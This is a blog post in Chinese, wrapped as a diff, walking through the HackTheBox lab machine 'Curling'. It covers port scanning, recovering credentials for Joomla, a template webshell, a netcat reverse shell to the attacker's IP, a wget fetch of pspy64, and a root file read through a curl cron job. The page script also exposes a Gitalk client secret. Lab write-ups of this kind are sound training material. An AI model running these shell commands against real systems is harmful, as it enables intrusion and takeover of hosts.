@@ -1,0 +1,689 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>Curling - HackTheBox | 喵喵喵喵 | 某鱼唇的人类</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#66CCFF">
+    
+    
+    <meta name="keywords" content="HackTheBox">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;160  10.10.10.150                                                                                                              端口扫描22和80: 123456789">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Curling - HackTheBox">
+<meta property="og:url" content="https://darkwing.moe/2020/02/08/Curling-HackTheBox/index.html">
+<meta property="og:site_name" content="喵喵喵喵">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;160  10.10.10.150                                                                                                              端口扫描22和80: 123456789">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122601.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122801.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122802.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122803.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122804.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122805.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122806.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122807.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122808.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122809.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122810.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122811.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122812.jpg">
+<meta property="article:published_time" content="2020-02-08T08:19:17.000Z">
+<meta property="article:modified_time" content="2020-12-28T08:20:25.781Z">
+<meta property="article:author" content="暗羽">
+<meta property="article:tag" content="HackTheBox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122601.jpg">
+    
+        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">暗羽</h5>
+          <a href="mailto:1126955201@qq.com" title="1126955201@qq.com" class="mail">1126955201@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/zjicmDarkWing" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://www.weibo.com/zjicmDarkWing" target="_blank" >
+                <i class="icon icon-lg icon-weibo"></i>
+                Weibo
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://twitter.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-gratipay"></i>
+                彼女募集中
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://darkwing.moe/2015/01/01/%E4%B9%A6%E5%8D%95/"  >
+                <i class="icon icon-lg icon-link"></i>
+                一些链接
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Curling - HackTheBox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="検索">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Curling - HackTheBox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-02-08T08:19:17.000Z" itemprop="datePublished" class="page-time">
+  2020-02-08
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#基本信息"><span class="post-toc-number">1.</span> <span class="post-toc-text">基本信息</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#10-10-10-150"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">10.10.10.150</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#端口扫描"><span class="post-toc-number">2.</span> <span class="post-toc-text">端口扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#80"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">80</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#secret-txt"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">secret.txt</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Joomla"><span class="post-toc-number">3.</span> <span class="post-toc-text">Joomla</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#webshell"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">webshell</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#reverse-shell"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">reverse shell</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#用户信息"><span class="post-toc-number">4.</span> <span class="post-toc-text">用户信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#user-flag"><span class="post-toc-number">5.</span> <span class="post-toc-text">user flag</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#提权信息"><span class="post-toc-number">6.</span> <span class="post-toc-text">提权信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#root-flag"><span class="post-toc-number">7.</span> <span class="post-toc-text">root flag</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#参考资料"><span class="post-toc-number">8.</span> <span class="post-toc-text">参考资料</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Curling-HackTheBox"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Curling - HackTheBox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-02-08 16:19:17" datetime="2020-02-08T08:19:17.000Z"  itemprop="datePublished">2020-02-08</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
+<li><p><a href="https://www.hackthebox.eu/home/machines/profile/160" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/160</a></p>
+</li>
+<li><h2 id="10-10-10-150"><a href="#10-10-10-150" class="headerlink" title="10.10.10.150"></a>10.10.10.150</h2></li>
+</ul>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122601.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22和80:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV 10.10.10.150</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-28 15:25 CST</span><br><span class="line">Nmap scan report for 10.10.10.150</span><br><span class="line">Host is up (0.068s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)</span><br><span class="line">|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)</span><br><span class="line">|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-generator: Joomla! - Open Source Content Management</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Home</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 41.60 seconds</span><br></pre></td></tr></table></figure>
+
+<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>是一个joomla，页面信息得到一个用户名，Floris，页面注释里secret.txt得到一个密码：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122801.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122802.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122803.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="secret-txt"><a href="#secret-txt" class="headerlink" title="secret.txt"></a>secret.txt</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Q3VybGluZzIwMTgh</span><br><span class="line"></span><br><span class="line">$ echo &#39;Q3VybGluZzIwMTgh&#39; | base64 -d</span><br><span class="line">Curling2018!</span><br></pre></td></tr></table></figure>
+
+<h1 id="Joomla"><a href="#Joomla" class="headerlink" title="Joomla"></a>Joomla</h1><p>然后使用上面得到的用户名密码可以登录Joomla：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Floris ： Curling2018!</span><br></pre></td></tr></table></figure>
+
+<p>这里出错也不影响后面操作：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122804.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>就是编辑模板文件吗，修改php代码：</p>
+<p>Extentions &gt; Templates &gt; Templates &gt; Protosta:</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122805.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122806.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122807.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h2><p>注意编码，主要是&amp;编码为%26:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.15 4445 &gt;/tmp/f</span><br><span class="line"></span><br><span class="line">python3 -c "import pty;pty.spawn('/bin/bash')"</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122808.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h1><p>当前是www-data用户，需要到floris用户，在/home/floris目录有个password_backup文件，下载下来分析处理：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4446 &gt; password_backup</span><br><span class="line">nc 10.10.14.15 4446 &lt; password_backup</span><br></pre></td></tr></table></figure>
+
+<p>查看password_backup是hexdump，后面就是查看内容，确认格式，解码流程(繁琐的流程，Cyberchef大法好)：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat password_backup | xxd -r &gt; bak</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> file bak</span></span><br><span class="line">bak: bzip2 compressed data, block size = 900k</span><br><span class="line"><span class="meta">$</span><span class="bash"> bzip2 -d bak</span></span><br><span class="line">bzip2: Can't guess original name for bak -- using bak.out</span><br><span class="line"><span class="meta">$</span><span class="bash"> file bak.out</span></span><br><span class="line">bak.out: gzip compressed data, was "password", last modified: Tue May 22 19:16:20 2018, from Unix, original size modulo 2^32 141</span><br><span class="line"><span class="meta">$</span><span class="bash"> mv bak.out bak.gz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gzip -d bak.gz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> file bak</span></span><br><span class="line">bak: bzip2 compressed data, block size = 900k</span><br><span class="line"><span class="meta">$</span><span class="bash"> bzip2 -d bak</span></span><br><span class="line">bzip2: Can't guess original name for bak -- using bak.out</span><br><span class="line"><span class="meta">$</span><span class="bash"> file bak.out</span></span><br><span class="line">bak.out: POSIX tar archive (GNU)</span><br><span class="line"><span class="meta">$</span><span class="bash"> tar xf bak.out</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat password.txt</span></span><br><span class="line">5d&lt;wdCbdZu)|hChXll</span><br></pre></td></tr></table></figure>
+
+<h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>得到的密码就是floris用户密码，直接ssh登录，得到user.txt:</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122809.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.14.15:7777/pspy64</span><br><span class="line">chmod +x pspy64</span><br><span class="line">./pspy64</span><br></pre></td></tr></table></figure>
+
+<p>admin-area目录里有input和report,看起来report就是input里给出的地址的内容，并且pspy64结果显示是root定时通过curl读取input，将结果写入到report：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122810.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122811.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>并且查看input和outout都是我们可写的，那么就可以任意读写文件</p>
+<h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>只需要修改input，即可在report中看到root flag：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url &#x3D; &quot;file:&#x2F;&#x2F;&#x2F;root&#x2F;root.txt&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020122812.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
+<li>HTB: Curling | 0xdf hacks stuff<br><a href="https://0xdf.gitlab.io/2019/03/30/htb-curling.html" target="_blank" rel="noopener">https://0xdf.gitlab.io/2019/03/30/htb-curling.html</a></li>
+<li><a href="https://www.hackthebox.eu/home/machines/writeup/160" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/writeup/160</a></li>
+<li>HackTheBox - Curling - YouTube<br><a href="https://www.youtube.com/watch?v=Paajc2Dupms&amp;feature=youtu.be&amp;ab_channel=IppSec" target="_blank" rel="noopener">https://www.youtube.com/watch?v=Paajc2Dupms&amp;feature=youtu.be&amp;ab_channel=IppSec</a></li>
+</ul>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最終更新：<time datetime="2020-12-28T08:20:25.781Z" itemprop="dateUpdated">2020-12-28 16:20:25</time>
+</span><br>
+
+
+        
+        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
+        
+    </div>
+    
+    <footer>
+        <a href="https://darkwing.moe">
+            <img src="/img/avatar.jpg" alt="暗羽">
+            暗羽
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2020/02/08/Curling-HackTheBox/&title=《Curling - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2020/02/08/Curling-HackTheBox/&title=《Curling - HackTheBox》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2020/02/08/Curling-HackTheBox/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Curling - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2020/02/08/Curling-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2020/02/08/Curling-HackTheBox/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2020/03/03/Warmup-HCTF-2018/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Warmup - HCTF 2018</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2020/02/07/Shocker-HackTheBox/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Shocker - HackTheBox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'd35074a248599729ad26',
+          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
+          repo: 'BlogComments',
+          owner: 'zjicmDarkWing',
+          admin: ['zjicmDarkWing'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.png" data-alipay="/img/alipay.jpeg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>このブログの内容物は<a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.ja" target="_blank">クリエイティブ・コモンズ 表示 - 非営利 - 継承 4.0 国際ライセンスの下に提供されています</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>暗羽 &copy; 2014 - 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2020/02/08/Curling-HackTheBox/&title=《Curling - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2020/02/08/Curling-HackTheBox/&title=《Curling - HackTheBox》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2020/02/08/Curling-HackTheBox/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Curling - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2020/02/08/Curling-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2020/02/08/Curling-HackTheBox/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
